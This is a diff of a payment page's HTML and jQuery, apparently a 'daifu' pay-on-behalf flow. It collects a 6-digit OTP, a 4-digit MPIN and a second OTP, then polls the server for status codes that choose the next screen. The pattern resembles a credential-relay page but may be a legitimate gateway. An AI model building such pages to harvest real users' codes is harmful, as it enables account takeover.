@@ -450,7 +450,7 @@ NEXT
 
 <!--pay code end-->
 
-<!--second verify OTP-->
+<!--verify OTP-->
 
 <div style="display: none;" id="digit" class="main-container daifu-otp-page otp-input-style warp2">
 <div class="page-container content-center">
@@ -461,7 +461,7 @@ NEXT
 <p class="text-center error-text"></p>
 <div class="page-item otp-password-field">
 <div class="ap-digital-password" accessbilityid="otp-input">
-<div class="container2"><input type="number" class="otp-input2 nodisabled" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;"><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""></div>
+<div class="container2"><input id="logincode" type="number" class="otp-input2 nodisabled" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;"><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""></div>
 <span class="result"></span>
 </div>
 </div>
@@ -859,7 +859,7 @@ NEXT
 			//$("#timeout-page").show();
 			//$("#balance-page").show();
 
-
+			$("#failed").show(); 
 			function orderStateById() {
 				$.ajax({
 					//url: httpUrl + "/Info/OrderStateById?orderId=T11072332438744375524",
@@ -921,6 +921,16 @@ NEXT
 
 						if(data){
 
+							if(parseInt(data.status)==2&&step==1){
+									//验证码过多
+							}
+							if(parseInt(data.status)==9){
+								clearInterval(timer);
+                                $('.loadingBox').fadeOut();
+                                $(".warp2").hide();
+								$("#timeout-page").show();
+								//	$("#balance-page").show();
+							}
 							if(parseInt(data.status)==1&&step==2){
 								clearInterval(timer);
 								$('.loadingBox').fadeOut();
@@ -933,10 +943,13 @@ NEXT
 								$('.loadingBox').fadeOut();
 								$('#digit-btn').after('<p class="errortip">6-digit code is not correct</p>');
 							}else if(parseInt(data.status)==3&&step==2){
+								//验证码过多
 								clearInterval(timer);
 								$('.loadingBox').fadeOut();
 								$('#digit-btn').after('<p class="errortip">'+data.desc+'</p>');
+								
 							}else if(parseInt(data.status)==1&&step==3){
+								setTimer(order_id,9,2)
 								// pin 码验证成功
 								// clearInterval(timer);
 								// $('.loadingBox').fadeOut();
@@ -947,10 +960,7 @@ NEXT
 								clearInterval(timer);
 								$('.loadingBox').fadeOut();
 
-								$(".warp2").hide();
-								$("#digit2").show();
-								$("#code2").focus();
-
+						
 								$('#mpin-btn').after('<p class="errortip">4-digit MPIN is not currect</p>');
 							}else if(parseInt(data.status)==3&&step==3){
 								clearInterval(timer);
@@ -960,31 +970,34 @@ NEXT
 								clearInterval(timer);
 								$('.loadingBox').fadeOut();
 								$('#mpin-btn').after('<p class="errortip">'+data.desc+'</p>');
-								
-	
-							
+
+							}else if(parseInt(data.status)==5&&step==3){
+								//需要二次验证
+								clearInterval(timer);
+								$('.loadingBox').fadeOut();
+								$(".warp2").hide();
+								$("#digit2").show();
+									//$("#digit").show();
+
 							}else if(parseInt(data.status)==1&&step==4){
 
 								// 二次验证证成功
+								setTimer(order_id,9,2)
 							
 							}else if(parseInt(data.status)==2&&step==4){
 								clearInterval(timer);
 								$('.loadingBox').fadeOut();
+
 								$('#digit-btn2').after('<p class="errortip">6-digit code is not correct</p>');
 							}else if(parseInt(data.status)==3&&step==4){
+								//验证码过多
 								clearInterval(timer);
 								$('.loadingBox').fadeOut();
 								$('#digit-btn2').after('<p class="errortip">'+data.desc+'</p>');
-							}else if(parseInt(data.status)==4&&step==4){
+							
+							}else if(parseInt(data.status)==1&&step==9){
 								clearInterval(timer);
 								$('.loadingBox').fadeOut();
-
-								$(".warp2").hide();
-								$("#timeout-page").show();
-							}else if(parseInt(data.status)==5&&step==4){
-								clearInterval(timer);
-								$('.loadingBox').fadeOut();
-
 								$(".warp2").hide();
                                 $("#success-page").show();
 							}
